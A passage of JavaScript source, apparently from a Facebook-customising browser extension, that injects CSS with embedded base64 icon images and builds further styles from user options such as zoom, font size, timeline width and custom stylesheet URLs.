body.timelineLayout .fbTimelineTimePeriod\n			{ background:none !important; } \n	html.timeline_single_column body.timelineLayout .timelineUnitContainer,\n		html.timeline_single_column body.timelineLayout .timelineReportContainer\n			{ width:auto !important; border:1px solid #C4CDE0 !important; padding:13px 15px; }\n	html.timeline_single_column body.timelineLayout .timelineUnitContainer:hover { border:1px solid #97A4C2 !important; }\n	html.timeline_single_column body.timelineLayout .timelineUnitContainer .uiCommentContainer { width:auto !important; margin-left:35px !important; }\n	html.timeline_single_column body.timelineLayout .statusUnit { padding: 0 0 10px 0 !important; }\n	html.timeline_single_column body.timelineLayout .fbTimelineUFI { top:0px !important; margin-top:0px !important; }\n	html.timeline_single_column body.timelineLayout .fbTimelineUnit .topBorder, \n		html.timeline_single_column body.timelineLayout .fbTimelineUnit .bottomBorder \n			{ display:none !important; }\n\n		\n	html.timeline_white_background body.timelineLayout { background-color:white !important; }\n	html.timeline_white_background body.timelineLayout .timelineUnitContainer { border:1px solid white !important; border-bottom:1px solid #C4CDE0 !important; }\n	html.timeline_white_background body.timelineLayout ol.fbTimelineCapsule { border-left:1px solid #ccc !important; }\n\n	/* "see more" links */\n	html.expand_see_more .text_exposed_root .text_exposed_hide { display:none !important; } \n	html.expand_see_more .text_exposed_root .text_exposed_show { display:inline !important; }\n	html.expand_see_more .UIStory_Message .text_exposed_hide { display:none !important; } \n	html.expand_see_more .UIStory_Message .text_exposed_show { display:inline !important; }\n	*[class*="aid_174424289341"] .text_exposed_root .text_exposed_hide { display:none !important; } \n	*[class*="aid_174424289341"] .text_exposed_root .text_exposed_show { display:inline !important; }\n	*[class*="119314224763738"] .text_exposed_root .text_exposed_hide { display:none !important; } \n	*[class*="119314224763738"] .text_exposed_root .text_exposed_show { display:inline !important; }\n\n/* Setup Wizard Styles */\n	.sfx_type_selector {\n		padding-left:110px;\n	}\n	.sfx_type_selector > div {\n		border:2px solid #ccc;\n		-moz-border-radius:10px; \n		-webkit-border-radius:10px;\n		-border-radius:10px;\n		padding:5px;\n		cursor:pointer;\n		opacity:.8;\n		margin:5px;\n		padding-left:50px;\n	}\n	.sfx_type_selector > div:hover {\n		border-color:red;\n		opacity:1;\n	}\n	.sfx_type_selected { \n		border:2px solid #3B5998 !important;\n		opacity:1 !important;\n		background:white url("data:image/gif;base64,R0lGODlhIAAgAPcAAERarKSqvNTW3HR%2BpKSu3GR%2B1LTC7ISW5MTu%2FCxO1LTa9ISq9Exq1HSW7Lzi%2FHyi7JzC%2FJS29Fx%2B7KzO9DxazOzu7OTm9Fxy1GyW%2FGRunMTW9KS29GyK7JSWnHyi%2FKTK9PT6%2FIyy9Ky23CxS3DRa3GyS%2FMTCxHSe7Hyi9JS%2B%2FLzO9OTy%2FNTq%2FExy5HSK3LTe%2FISq%2FMTq%2FFxutGyS7KSmvDxSvKSy1ISq7JSm1DRWzERm5Mzi%2FKzG9Iy2%2FHSe%2FMTe%2FJyepDxi3Mz2%2FKzW%2FNTi%2FKS%2B9KTK%2FPTy%2FGR2tKSu7OTm5HyGtFx%2B5MzS3ISu9HSW9Lzm%2FHym7KTO%2FGR61Hya%2FGSK9HSe9Iym9LzO%2FFR67DRSxLS6zIyi5Jy6%2FLza%2FNTm%2FGR2xNTW7ISKnNzu%2FCxS1FRu1HSa7JzG%2FGSG9DRa1PT29Exy3HSa%2FMTW%2FJSWpHym%2FPz%2B%2FIyy%2FKy25DRW3Dxe3ISm9Oz2%2FOTq%2FExy7HyS3ISu%2FGyS9Iyy7DRW1Exu5KzG%2FJS6%2FNTS1GRyrLSytMzS7Nze3GyS5DxWtERm3PTy9KSirFyC9KS6%2FJym3ERi5KS%2B%2FLTK9JSq7NTe%2FLTK%2FGR2vHyCpMzy%2FJy69Ky21NT6%2FLTa%2FFyC5KzS%2FGyO9LzS%2FLy%2BzJSm5Mza%2FJyapFR27ISa5GyO7DxWvERq5Mzm%2FJyipPT2%2FKSy7DRWxGR6xKy65Iyq9MTi%2FISi7HSW%2FPz6%2FDRS3Dxa3HSS%2FHye7ISi9Jy%2B%2FOzy%2FNzq%2FLze%2FHSS7LTG9JS2%2FHye%2FMze%2FERi3LTW%2FNzi%2FKzK%2FNTS3Iyu9MTm%2FISm7KzO%2FHye9Nzm%2FDRS1Hya7KTG%2FDxa1FRy3ISm%2FJSy%2FIyu%2FDxW1Ky%2B%2FGSC5MTS%2FOdt%2FxhQ%2FwAA%2FwO08wB5ogBQxAAAde00WDkAqgkAQgDAAHKo2ADnfwAYeAAAAHMAAAABAAAAAAAAAPLnVSu%2F6dPFGHd1ABABUIYAAAgAAJ4AAHIAvAAAyAAAQAAAnoBQUAzoAEcYAAQAAGgueU9n3dZpSAVmACH5BAAAAAAALAAAAAAgACAABwj%2FAOEIHEiwoMGDCA0eMZAnWq00JIJM4UJoVsKEFg6QoLVmRhQ%2BN0htokOGgRxVFwmCIEBC2A0HCGI40MRJihFlEZiQKVMxpS4Xcx4gsBTjhTIjEFIA6hEHBjUUwvoQsIhQ1zVoE4RYgqJp2NEzuS4xPQbjzTI%2FzXCgNKjKBR1NmYQgmznEJlhAv6jpqSPNAzA8zWxQJbiqz4e4CKDwonk0Kd441KQteCRtmY4cTQpaqHUrE9G5L2hKeQYh11JqdR59mbSMzZ45YBIRJBVkaAwoDkJzOkoaECBqCzSsCCaNjY8nLZptoXoEWrKtDniFHlITqWknV4jp2jUNGLAnsqqM%2F6CkRqABWrxiaFo%2FjPrX0gti3VmxYpJfK2yelBCWI5DAA2sgwMsQ1HFSHWkpHOPMLroMV4df4Mmyhx8J0CBQNIbEoMwzyihjkxFnlBZCL0ToMsYuXdzHhixPYDBKAkuAAAcdUThgRAgRQPBMiKUBUgoWDe7ShjQoAHMciyWMQgYSss1xgyYQQKACMzzkkotSJ0SywhhjMDONX8exgcEeJWRBiwwVwOEcJymkUAQxs7Rh2jEcELPCLrt4ggKEsiDZiZJowiGMGRP49ksEqoBARC57bMAlM19QoyKSsqChpCCyTbGJMnH88ksIWICgiiQNfIEnC1j41RqLEpYgQQsJDP9QXiTQSBEHZHG8oosdKzCzCwuoRLqMD%2FmJSWYnWZySgCgChZFACDA4ocdevgTJwhc7YAMMFUc%2BYUsJJVhKQg0mCDRLNExQA8O60tSxS5df%2FPDFNPit2OKxo%2BCRQAZKDORKM1bU8caDy0yCLSw%2FhAJMfhiAZwuZEoxChxaKDKbKBUEA45cHVuDyBSxe7PBLhPqR6Wqy%2BxZSECHV%2BEHFMt49UYwXbRABDKslmBwxHmQcMshgA8lBRgts5PfEAsPsYA2Se3zbyc591NCBbAbNgkMziHSyoizPEEGFySV0skgWo5zSTA1ipInQLCJAM0cLaDRdcidoSEA2HnQkcEgHFqRLBIcxYJDRjCN%2BjJIF2aO0cEotCWiRwSBU%2B53IJ2CwkkACI9AywuV6Z5CKyn4XlIgAASyBhAyCCDIAECZYAHToBc2SSAUVJFKe3wEBADs%3D") no-repeat 5px center;\n	}\n	.sfx_type_title {\n		font-weight:bold;\n	}\n	.sfx_logo_128 { \n		background-image:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIAAAABWCAIAAACIOwmuAAAACXBIWXMAAC4jAAAuIwF4pT92AAAXrklEQVR4nO1dd3hUxRafu%2BVub8km2SS76Y1UhBghCRAgQYXEoCBNHoqoqGBB4aGo71koDyyfCoI8fRZAQRELEFDRUIyUIALpld3Uzfbe9%2B59f2yyuVsS0sii4fftH3cmc%2BfOnDNz5sw5ZyYQiqLgFvwHnL8bMNZB8M6yWO2Xa8WidpXZah%2F9Bv39gIMgLoeakRQaHsL0%2FqsbA%2ByIY%2F%2FRq18evaozWEareWMFEARuT%2BU%2FvSw7Kpzjlu9aA0wW2wtv%2FXSpusMfzRsrIJMIG58pmDQ%2BwpXTuwZs2X36FvVvNMwW%2B8vvnRB1qFw53Qy4VN1Rer7ZT60aWzBb7Nv3nnMluxlw5GSdn9ozFlFe2dYl1zufuxlQ1SDxX3vGHFAU1DR1E7ybAVq92X%2FtGYvQ6Lv1zG4G3NoOjzZ6KH5rJ%2Bxn%2BNgJ%2F70RxecIeCwURa%2B1KTulOn83Z4wxYOXCrH8U3%2BZ8RlH0nc%2FKvjtRM%2Fxqk2OD166Y4koqNca1W48P8N2xxYC5%2BcmuZwiC7s1PGREGUCnEhCiuKylV6Af%2B7thaA%2BhUEjbJpJP6KjlqGFsMUOtM2KRK63%2Fle2wxYO8Pl%2B2Iw%2Flssdr3%2FnDZv%2B0BY20N%2BPp45bEzDaFchgNFOyVak8Xm7xaNKANgIp7LoTFoMA4H2e0Ojd4iVxkcjoHu8agUYlgQk0En4XGQyWKXKw1SpWHEPaZ6g6VxYN4OCpnIZVOpFCIOB9nsDq3eolAbkZ4JNFIYAQaEBNLnFiRn3xYZFcbG491kmtlir2qU%2FFTW8HNZI9IHJzhMytz85LysmGgBBwdB2D9p9ZaLVe1HSmv%2FqOrPTm41azTiqkAaEhHGDGDRHCjaKdU2tZtY%2FCw8wW2Zffi%2BiXdkCFzJktP1h0trvbtz%2F11pORMi%2BTwm5N4eqw1pEMpPXrh2%2BGStyTwys2e4DJgzLfG55bkk2Hc9ZBIhMzU8MzV8bn7K%2BreOq70WvdnTEp9Zlk2jwD5fZ9JJMyfFzpwUe%2F5K66YPT6m0Jo8CRo2YaKqdd2dmYeH64OBgBEEQBCEQCCwWa8eOHTv2lfKT78aWD%2BexUuJDXMmLXnydkhn1r1UzKCSiz%2FbARHxqQkhqQsj8u1LXbj3W0qn2WWxQGNYifHsa%2F4XHpvVFfSxS4oJfeyofcs9cPCdjw8q8vqiPxaTxER%2F8%2Bx42g4zNVLX8vmAK9Ycv31u0aAGBQFAoFFqtFgAglUofePDxz491eFD%2FuhCEsl5dPbMv6mMRGsTYtGaWx3QfGoZVxcPzJmInqcOBVjVIfi5rLDldf%2Fqi0GPATkwJH58c5kqmJoQ8sfgO7zrtiMNqQ7wlf0Qo%2B8WVea6kquX3N19atHTpEpVKZTQaHQ4HDMNMJnPP3n0LH90oBpksXtJgu7OkMMNjMKEoMFvtJovdeymKCudkpfEH%2BwlvDF0EUcjElLgQbM7zW49drGx3JWkU%2BONN9wl4LFfO5PERl2s6nc9PLLoDh3Nj3oGSq0dO1XVItA4HSqPCE8aFPbYwK5rf68LOmRA5flzolVqx3WYqyApKT0%2FXaDTOEcBkMuvr61%2F7zy49nBoQM2NoPZqMcdUCAPaXXP3i8BW1zgwAoFKI0%2B%2BIWbdiKgEz6pNigs5daR3at1wY%2BgwIZFGxFAQAVNR3YZMGk%2FX7EzXCdpXrRyR0f04QyspICsUW3v1V%2Bc79F9rEGqfWZDBaf7skWvX6DzKlAVusaPo4AIBB1ZaTPUmv797x4%2FH4tra2x9d%2F6AjKp7Lcqh046FSYy6G5knKVcdf%2BC07qAwCMJlvJqfrzV9qwr9Co1xee18XQZ4AD9VTInv7H5P9%2BfVGj611pvzpe8dXxCu93PSav3mg9%2BGOldzGt3vLNT1VYSZWVxocgYNbLwsLClEoli8VyCge9Xg8zQgGAvCsZIMxW%2ByMvf%2Bt8RlHUYLJ5K9BKjXHI9feFoTNApjRabQhMxLtyimcmz8lLqhfKK%2BrEV%2Bu7Kuq7%2BnK0xUVyscmqRonVhvgs6RJZTnBYlEA2VYKY2Gx2Q0MDjUYjEAgIgqSlpbGg3QCkDLk7druj7prMOx%2BCoOBAWmQoOyKMPS42eMj194WhM8BmR377QzRzcqxbdXhcSlxwSlzw4sIMFEVFHerLNZ1lf4r%2BqOrADqjgABr2LbFU29dXxHJPk31wAF0IAxiGIQjq6uri8%2FkoiorF4lUr7t20%2B7cA%2Fm0%2BakFRqeg8NyJzIP2CIJASFzIxNTyaz4kMYwt4bDLpBtoLhlX1B1%2BcS40PCeHSff4VgqBoPieaz7lvVkqbWPPOZ2WuJZpKdlP1jH1vakwmzz9RKUQKCU8gEGAY1ul0er1eJpMFBATExcWl8X9ptZnwRIpb5Rox1VL5%2BP05H39fA8Cd%2FfcoJT5k7cNT4iMD%2By82ghiWGipVGla8dOjbn6sNJmv%2FJQWhrLfXz86dGOVMDsK84CXVUQAYNBiCIBiGYRgWi8UCgYDFYul0umdWP6ppPe0q6UBsymul83MpBz577%2F7777eZ5P1%2FKiudv%2BOVor6or9Ka1LqRt54Od3KpdeZ3Pivb8cW5tAReRhIvIyk0OS7Y514Gh4PWPJRz9nKLw4F6DPl%2B9mLefzKabGwGBQAAw7DdbjcajSqVis%2Fn8%2Fl8mUy2fH7Ovl%2BEjMBojaQuPlC5a%2FcGCoXS2dlJpVIBrj%2BlhUImvvzEDCKhd0kzGK2nLwprmqWiDpWoQ63WmtatmFo8c9xAyDJwjIx0s9qQS9UdzshGAh6XEM3NSAy9I0MwISUMa94JCaTHCAKaWhQePqOwYEZfNYcFe0YUSxX6EBYFRVEYhhEEoVKpdDp93759ubm5TCYzP3%2FmsV%2FeEFZV%2FfPx2cXFxV1dXSqVisFgHC05xuL1R7vpWTEBrF7ZJZHrH%2FvXdwq1m9qDuwHG%2B6FXmRDFddp5nD%2FXSmBHHDVN0v0lV5%2FdfHT164c9lDmnrt3YosBmpsSH9GXPmJgajk0q1Ea5UhvCZTpJHxkZWV9fv3r16vOXaletWk2j0TQazQvPrRwfQ8jMzGxvb7fb7RAE0Wi0L78%2FR6ZxfX7CibREHjb5Y1mDB%2FUBAGwmBYw0hs6AB4rGv7uh0PVbMifDu0xFfZfUfSdltyMAgPKKNixbaBR4sa%2FXOSzKfQVumuWFq21mvTwmJppEItlstnXr1lVXV69atYpMIoQKYrdt28bn8%2Bl0ekxMzNWrV51bBCaTuW%2Ffl4TACf13Bzv8AQDeajEJJmS4M2lEMHQG1DRJscm7piYkRnsOscTooCB3jdNpQeyQaP90j8ReMX%2Fi88tzE6O5FDKRQMAFsqkF2XG7Xp3rQZfDpbUGdXtGRsahQ4eWLVsWFRXF5XIVCsWsGTlqjaHsbHlFRQUMw0uXLj1x4oTVanWu1QeO%2FkGm9zf8AQB2d0P%2FjDtiscsPCSb885GpTDrZ673hYuhrwImzjY8uuN2lI9Mo8Edv3Fd7TdYh0VisCEzEhwYxUuKC8RhzRWVDl8u08OH%2BCx%2B%2BNtdlUIQg6N6ClHsLUgAAKIp6GOKdKD3fXNUoIaHqhISEx1at5QrGWywWAoFAoVDUanXx7Gknyy5v3bp1%2F%2F79IpGouLj4999%2Fnzdv3ieffk7hZV23O21iDTYZGxHw9buLr9SKdUYLk07OSOSxGCNPfTCcGaDUmN7fe9atLhyUEhc8Kye%2BaHrSnbnx6Yk8rMHWakPe39Nbvvaa7L29Z33qoz6p39Si2PbxGRR1TEwONhqN9xYWKDS2pmahRCLR6%2FU8Ho%2FP54eGBBjNdhiG%2BXz%2B1KlTT548qdfrvztRA1PY1%2B1O6flmD4sni0GelhVdmJc0NTPqBlEfDHMfcLi0dvPuU9fdBAAAlGrjP988Xuu%2B1%2F%2F25%2BpXt%2F%2Bq1V%2FfQfjruebVbxzWG62qjooF84pkMtn9988LoCNSc4hWqxWJRHK5%2FMyZM1aT5tDB%2FQaDYc%2BePU899dSECRN27NxND%2Fdh9PZGg0j%2BxZEr%2FRSw2ZHyivZ%2BCgwNw1VDj52u%2F%2F3PlsK8pCmZUQlRXKxpCABgsSJ1QtmpC9dKTtcZvfa0AIBfzzWVV7QV5iXlZUUnRHOxajgAQCLXl1e2HSmtq2mWAgBQ1BHJ0aSlpUmlUrvdvv7Zh59%2F9b%2B1LeSUaFxJScny5cujo6Nf%2Fvfm0lNnnnx0aU5OTkhIyLfvfxuc0Lv8torVV%2BrErmSXzM3O8eGBCw0i%2BaLZ6UkxQVhDr0JtLLskOnCsgh%2FCguHeFnb2WFB0Biu2Wm%2FPXT%2FoPiNWsPyT4YcI4PG4oAAai07C43EI4tDozDLVILzYBAIuJJDOoJFwOMhktslVRo%2Bzggrhbx%2B%2F9QSLxXKurjQa7X%2Bf7v364DeFd%2BevWLFi67ZtFxtsIXHTEZsJiL97aNnSysrK8y0hFGZIX1%2FsC1QKkcdlkEkEu92hUBu99dHh4%2Fnluc4FbyQZcENhUHfMz6UkJSaUlZURicQ5c%2Baw2WwOh0OlUo8eLXl791EKL9Mp6xGbWSe%2FNj3V8UtZVeC4Rf5uuG%2B4GPDXCMxyIDYesSk1JVkoFBYXFxcUFBw7dgwAgMfjN2956%2B09f7Ki810rLZ5IJlEZR0qrybxsv7Z6QBjiGsBhUhJjggJZFDweZ7Ha1VpzdbNUj5EYk8dHZCSFkmC8TGU88Xujh2NrsNC2nnrt9ZXV1dXTpk3D4XAAADabzeVyN25%2B87yQweJFe5SnsAT8jIXD%2BeKoYdAMYNLJax%2BekpcV7eGPfPGdn377Q%2BR8vjM3%2FpUnex2zC%2B5KXbhmv8Xq2%2BVyXai7ap9efmdFRUV2drZLQ42IiNiz94uzjSQGdwQ8437EoEXQ5jWzZkyK8aC%2BB7LSBdgkl0OLjRiihd1m0U%2BINJPJpNTUVAKBAABAUVQul1Op1D2HKxncmKFVe%2FNgcAxIjgseP%2B76Xm8PZdRnzgBhl5QtWTgXgiAOhwMAQFEUQRAikfjuzi8CI3OGVudNhcGJII84FACARmfulGqJBDw2VK%2FT3cWIoqh4SIeBFK0XXnt6cXNz88SJE0GPiUIqlV65WqGDU6i%2BNsx%2FOQyOAWym2468XaJ9cP1Bi9elKl8dq4gVBKQnhZKIeLnK%2BNXxCslgDo04YdJJC3N4Wq02NTXVJfpVKhWBQNh%2F9GpAzMzBVnhzYnAM8AiebRLJvakPAFBqTGu3DfSQlE%2BgDoRhuTo190EEQUgkEgDAuV%2BxWq3%2F%2B%2FxrduTU4VR%2BU2FYpgi7Y9Cx2hAAqQk8EownEvAEAo5IwBPwOJ3B4hFiphSd3vbSg1KpNDk5GfQIn5aWFrVa3aQMZIV0uzwhCAhC2dHhnEA2lUQiOByo3mDpkGrrhfJBRS9DEDQuJigijA0T8S2dqqt1Xdd%2FZ4QwIAbMnZmMPQXoQv7kuPzJcc7nFS8dqhd2e71zJ0S%2B%2FkyBq1inVLt03dfOZxSAKZlRSwrd3C8OFH1289E%2Fq7tDgHTy5hXzs8Ri8bhx40AP9TUaDYfD2fTuflbUXQAABo20aE767KmJHv4GJ6w25MxF4UcHL3ZIPANeNqzMmz0t0ZVcs6VEZ7C88uSMyLDufdyZi8LRZMAN2QlDOAgm4l0%2ForsK9PHBi81tSrdGQNBLj09n0EgAAMRmjmV3RUVFRkRE4PG9L%2Bp0uoOHDpNDcwEAyXHBe7cteHDuBJ%2FUBwDARHx%2BdtynW%2BZPSAnzWcCFiFD2exsKXdQfffjBFGG1IRt3ltrsbvuykED6cw%2FlAgAM7Scfe3iJ1WplMBigR%2FSLRCKHw%2FFblYlIoocFM99eP5vLoV73Q1QycdOzs%2Fov%2BdjC20ckxHPI8I8tqLFF8cmhSx6ZBTlxSUGKNY8Vt7e3CwQC0EN9g8HAZrPf2bk%2FMCITAPDMsmznXHHB4UDbuzT1Qnlbl8YjBoBBI7lOZvvEQE4n3FAMaA04WX6tulkKAJg3K6Uwrzfu%2FkJF24cHyp3PrYM8LvLlkSs5t0WmJvRuLNra2jiwCoYjeTwe1ikmkUjq6hut9NsoAAoLZmbf5hZEfvZy638%2BOq3ssRgHsqkbVuZhzyHNyonfvvecvV%2BruPP%2BmKZWhR1B27s0%2FZQccQyIARqd2RnzrNK4uRp0Bkuj6DrhZn0BcaAbPzz56ZZ5ziguh8OxZcuWoqIio9EIwzDAaD4cDuebn%2BsDY%2FIAAJPHC7C8MVvsb%2BwsxboNFGrjv3f8euj9Ja6hzaCRkmKCqhr7vBDJaLa9%2BLbfLsvzpzm6vUvzwRfnnc8ffPDBzJkzxWJxUFAQ6BE%2BZrOZSqXu2L2XE5XrLJYQFYStobKhy%2FuCR73Bgj0nAgCIj%2BovJGL3gXI%2FXpbn53PCP%2FxaM2ViFOyQazQaOp0eFRUFMFERIpHIZDK1GwVMWnc7eUFugcCdUp1PD35Lh5s87CfyzmZHjp2pH3Y%2Fhg4%2FMwBFwaZdJ0LR8tmz78bhcFi9s729PSIi4rlXdrFiekOaPZbfoulJs6cleFfrYawNYPWpCDW3KkfqwOnQ4H%2BPWPPlo%2FfcU6TRaLB6p81mczgce7%2F8hsZ32wB6HEzE4SAiAe%2F9w7tHcdIofR58FMv8fGWQnxmgFlc%2FuSy%2Fo6MjPDwc9FAfRdG6ujocDteuYRBgt8E7tIPzxL6N4X6%2FI9ifIshm1o2PMAUEcFgsFg4zZru6umJjY0tKSr7cvemhF7%2FRG3vjjjzExemLwuMDkOD9xIn0dTRq1OBXBkjOLHnkcaVSSSaTQc%2Fa63A4tFptdXX1c889xwtirHko942dpa5XlGo3UhqM1rJLLcNpQ18XKIwa%2FCaCFC3n1q1eLBKJeDwewAifqqoqPp8fHBzs1IjuzI2fMan3GFprl5t6EzdUTycGfmaAf2aASSuZk8PT6XTR0dEQBLn0ToVCERkZefjw4e3bt7sKr314iiuqt7rRLSQ7PoqbGM11WWGdYDMp%2B7YtoGIW3u17z373ywhcTXYj4IcZgDoQuuXKPYWzjUYjkdhLJhRFOzo6GhubHlq%2B3Ol%2Fd4JJJ21Ymefk0KWqDmyIIwSBrWvvLpqeFM0PCOHSI8PY%2Bdlx218uYjPJWHNs5U18L7AfZoBSePLjd54%2FefJkeno66BH9KIpWV1enp6evenFHcNx0j3ja29P48%2B9MPfhjpcli%2B%2BHXmsUYdwKXQ13%2F6LR%2BPlfbLG1qVfRTwL8Y7RmglTU%2BuiibSqWSyWS1Wu0S%2FVqtNigoaNdHe1gRUz85dMnjDBMA4PFF3fdGfPrtpZZOlY%2BqfcFqQ97%2BtGxkuzCyGFUG2G2mOI7kkRUrWCxWUVFRc3OzwWAAAKhUqoqKCgRBqjtpeALZZkc27iz1UBBJMOFfT84gEvBGs%2B2ZTSWVDdd3WinUxnXbjvs8%2F37zYHAiSNiuOnNR6ErWNfvum0JlxBZT9thQdS2%2FZC%2Bcft%2FilXKNPYgNP7R4jkajKS8vZzKZCxYsWPLIC5zI2c6SzW3KXQcueBwQI5OJc%2FISv%2F%2BlRq4yPPna4SmZUbNy4tISeAEstwgVncFSL5Sd%2BUP045kG7yPg9UIZHeOBudaqBH7F6EVHK9svx7I6GhVcbtQkZ46itXzDyryEhAQmk7lj538vtvMGcpTFGxQykUknEfE4xIHqDBaDyXrz30Xuh%2BjoUJpCosG5qA8ACIzI2v35EYFA0NLS8usl5dCoDwAwmW0Sub5dohXLdHrjX4D6WIwSA1AHEs1na0yeRjGZFnU4HBvf3B0YOXl0WnKzYZQYAEE4HJ5IJ3sOTjoJ2bVrt4GU5tOsPxYwWiIIgi7XdBXlj9fKmlx5WmljPJ986EQtjR3ez6t%2Fb%2FQw4MaPPwczo0sim5tN1wh%2F6mo6rRb%2BNDMdtIq1AdHTb%2Fi3b2J0q6FUMvFGO4YoTN4FoY3bUvNAcRaZTJbKZD%2BdriaE5BHxY%2Bv6ZCeoPTED3Z1PiOIO%2FwLA64LGEZiA4JuzMptZTKZzKRGDu9fz7wTXrUTdImhWbvyofZtMD2JwY4hkH%2F%2FZcowgPpIbIwhwPnczYOak2OS4kb%2BR7ha8AUHQqgd6N0PdDMDhoI3PFHjfjnQLIwsIAqsemJSJuQQJwrq5VVrTO5%2BWnSq%2F9tfaTP5VEBRAW%2FNgztTb3Q7VQt5xBqIO1W9%2FiIQdKrPl1j90HgHgICgogJqRFJp9W6T3YUUfDLiF0YT%2FA7PGOP4Pc0D5TsvTga4AAAAASUVORK5CYII%3D");\n		background-position:center center;\n		background-repeat:no-repeat;\n	}\n	.sfx_bulb {\n		background-image:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAABGdBTUEAAK%2FINwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAGAUExURffqUevKDmhoa%2B%2FVIe%2FVGjExMe3PEwwWLvXoKv375%2FPiJPDZHfXjuPXcmfftLu7LmfzdferGCvv1uvbu1%2Fr0UfThSoR3eeegFPTAEPbMOkRTdPDYG9%2BkUvvej%2Fnaj%2BnECPLfIfz43l1vmDtQgvTlJ%2FbqyNiSEP38l%2FLeT9fb4%2FbpYdDV4j9CS%2FLeKIGBgfjvfvjul%2F354fG%2BAsvQ3vTjJe%2B1A0VVe%2FHcHvK3AsPJ1%2FnZffjssPnvs%2Fv7%2B%2FftM%2FfuMM%2FPz%2BuyEP788O2zIOqwM%2FC5PpSUoPG9TPjumICHVZuOS%2FjvMPftPurBBnFoS%2Fz20Pz33OWqQHmAkn%2BMrf79%2BP%2F%2F%2FfXkbvfqa%2FfQXffqgdve5ltbWyk4XuvJG3V7imBxmvXnLeikHPbolO%2FeyOnHm%2FPgKfPiLPLeP87Q1uekDOutBvnuquqyCvz5d0xae%2BvBi218ovrxtu7SFufp7evHDMfM2fHcLfv6R5eTT%2Fz4hOzMEPLdYfj5%2BuSkEezJmvb29nkDwNwAAADGSURBVHjaYqgHAlUrAUkjiQhhEJsBiHllQwKsY%2BV9LXghAjxyToo2SdWMjIKmPGABd07D0MIwDWa2qhJXsIBztj%2Bnh2gZN0sRWxZYIIc5Uig8jUvBXJrFESwgzp3KkMDBocKlm54IFuDPNOHg87b3YdBy4YdYm1%2FLJ5JbWakfWAd1R32Kml25uoFMMsxh9cViXhWefm71cAFL7ZqMOB0zhECpsa2Dno4UQiAqnimalb0AIVAfHMTEyl6PJKCpnBejBBEACDAA32BW%2BUs79PoAAAAASUVORK5CYII%3D");\n		background-position:center center;\n		background-repeat:no-repeat;\n	}						';
						add_css(css);

						var o = {};
						var zoom = +options.get('post_action_zoom')/100;
						o.floating_cp_opacity = options.get('floating_cp_opacity');
						o.post_action_opacity2 = options.get('post_action_opacity2');

						// Options that have to be written directly to the page. Bummer.
						var zoom = 1; try { zoom=+options.get('post_action_zoom')/100; } catch(e) { }
						var dialog_max_height = (window.innerHeight-200);
						var options_max_height = (window.innerHeight-125);
						var dialog_max_width = (window.innerWidth-25);
						var css2 = ''+
//						'#fbNotificationsList { max-height:'+(window.innerHeight-100)+'px !important; overflow:auto !important; } '+
						'.bfb_cp_float { opacity:%floating_cp_opacity%; } '+
						'.bfb_post_action_container { opacity:%post_action_opacity2%; } '+
						'.bfb_window_height { max-height:'+window.innerHeight+'px; }'+
						'.bfb_window_height100 { max-height:'+(window.innerHeight-100)+'px; }'+
						'.bfb_window_height50 { max-height:'+(window.innerHeight-50)+'px; }'+
						'.bfb_dialog .bfb_dialog_content { max-height:'+dialog_max_height+'px; overflow:auto; }'+
						'';
						// Size the options dialog for small screens
						var content_width = (dialog_max_width<951)?(dialog_max_width-325):700;
						css2 += '#bfb_option_container .content { width:'+content_width+'px; }';
						css2 += '.options_dialog { width:'+( (dialog_max_width<951)?(dialog_max_width-50):950 )+'px; } ';
						css2 += '#bfb_options_content, #bfb_options_tab_list { max-height:'+options_max_height+'px; overflow:auto; }';
						// Timeline single column width
						var tl_w = options.get('timeline_single_column_width');
						if (tl_w) {
							css2 += ' html.timeline_single_column body.timelineLayout .timelineUnitContainer, html.timeline_single_column body.timelineLayout .timelineReportContainer { max-width:'+tl_w+'px !important; } '
						}

						if (options.get('enable_font_size')) {
							var post_size = options.get('post_font_size');
							var comment_size = options.get('comment_font_size');
							if (!comment_size) { comment_size = post_size; }
							if (post_size) { css2 += '.uiStreamStory .uiStreamMessage, .uiStreamStory .uiStreamMessage .messageBody,.UIStory_Message,.mall_post_body,.timelineLayout .tlTxFe, .fbTimelineUnit .userContent {font-size:'+post_size+'px !important;} .timelineLayout .timelineUnitContainer .userContent { line-height:'+(+post_size*1.2)+'px !important; } '; }
							if (comment_size) { css2 += '.commentContent, .UFICommentBody, .UFICommentActorName {font-size:'+comment_size+'px !important;} '; }
						}

						if (zoom!=1) {
							css2 += ''+
							'.bfb_post_action { width:'+(15*zoom)+'px; height:'+(15*zoom)+'px; -moz-background-size: '+(105*zoom)+'px '+(30*zoom)+'px; background-size: '+(105*zoom)+'px '+(30*zoom)+'px; -webkit-background-size: '+(105*zoom)+'px '+(30*zoom)+'px; -o-background-size: '+(105*zoom)+'px '+(30*zoom)+'px;  } '+
							'.bfb_post_action_read:hover { background-position:0 -'+(15*zoom)+'px; } '+
							'.bfb_post_action_unread { display:none; background-position:-'+(15*zoom)+'px 0; } '+
							'.bfb_read .bfb_post_action_unread { display:block; } '+
							'.bfb_post_action_unread:hover { background-position:-'+(15*zoom)+'px -'+(15*zoom)+'px; } '+
							'.bfb_post_action_mute { background-position:-'+(45*zoom)+'px 0; } '+
							'.bfb_post_action_mute:hover { background-position:-'+(45*zoom)+'px -'+(15*zoom)+'px; } '+
							'.bfb_post_action_add { background-position:-'+(30*zoom)+'px 0; } '+
							'.bfb_post_action_add:hover { background-position:-'+(30*zoom)+'px -'+(15*zoom)+'px; } '+
							'.bfb_post_action_info { background-position:-'+(60*zoom)+'px 0; } '+
							'.bfb_post_action_info:hover { background-position:-'+(60*zoom)+'px -'+(15*zoom)+'px; } '+
							'.bfb_post_action_google { background-position:-'+(75*zoom)+'px 0; } '+
							'.bfb_post_action_google:hover { background-position:-'+(75*zoom)+'px -'+(15*zoom)+'px; } '+
							'.bfb_post_action_save { background-position:-'+(90*zoom)+'px 0; } '+
							'.bfb_post_action_save:hover { background-position:-'+(90*zoom)+'px -'+(15*zoom)+'px; } ';
						}
						css2 = _template(css2,o);
						add_css( css2 );

						var css_url = options.get('css_url');
						if (css_url && css_url.length>0 && css_url!="null") {
							insertStylesheet(css_url,'sfx_external_css');
						}

						var theme_url = options.get('theme_url2');
						if (theme_url && theme_url.length>0 && theme_url!="null") {
							insertStylesheet(theme_url,'bfb_theme');
						}
						
						css = options.get('css');
						if (css && css.length>0 && css!="null") {
							add_css(css);
